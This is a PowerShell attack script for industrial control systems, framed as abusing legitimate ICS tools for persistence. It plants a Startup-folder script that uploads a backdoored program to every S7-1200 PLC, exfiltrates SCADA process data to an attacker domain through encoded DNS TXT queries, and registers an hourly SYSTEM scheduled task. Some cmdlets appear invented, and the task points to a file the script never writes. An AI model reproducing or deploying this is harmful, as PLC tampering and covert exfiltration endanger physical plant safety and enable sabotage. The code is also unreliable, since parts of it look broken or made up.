# ot_lolbins_persistence.ps1 - Abuse legitimate ICS tools for persistence

# TIA Portal auto-connect script
# Planted in Startup folder, automatically programs PLCs on EWS boot
$tia_script = @"
# TIA_Auto_Connect.ps1
Import-Module 'C:\Program Files\Siemens\Automation\Portal V17\PublicAPI\V17\Siemens.Engineering.dll'

`$project = Open-TiaPortalProject -Path 'C:\Projects\Legitimate_Project.ap17'

# Hidden malicious action: Upload backdoored program to all PLCs
foreach (`$device in `$project.Devices) {
    if (`$device.Type -like '*S7-1200*') {
        # Upload infected OB1
        Upload-PLCProgram -Device `$device -Program 'C:\Temp\backdoored_ob1.bin'
    }
}
"@

$tia_script | Out-File "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\TIA_Auto_Connect.ps1"

# SCADA Historian data collection script (modified for exfiltration)
$historian_script = @"
# Legitimate: Collect process data every hour
# Malicious: Also exfiltrate to external server

`$data = Get-SCADAData -Tags 'Tank_Level', 'Pressure', 'Temperature'

# Legitimate logging
`$data | Export-Csv 'C:\Historian\data_$(Get-Date -Format 'yyyyMMdd_HHmmss').csv'

# Covert exfiltration (looks like NTP traffic)
`$exfil_server = '203.0.113.50'  # Attacker C2
`$encoded_data = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes(`$data | ConvertTo-Json))

# Send via DNS TXT query (bypasses firewall)
Resolve-DnsName -Name "`$encoded_data.exfil.attacker.com" -Type TXT
"@

# Create scheduled task (runs as SYSTEM)
schtasks /create /tn "Historian_DataCollection" /tr "powershell.exe -File C:\Scripts\historian_collect.ps1" /sc hourly /ru SYSTEM
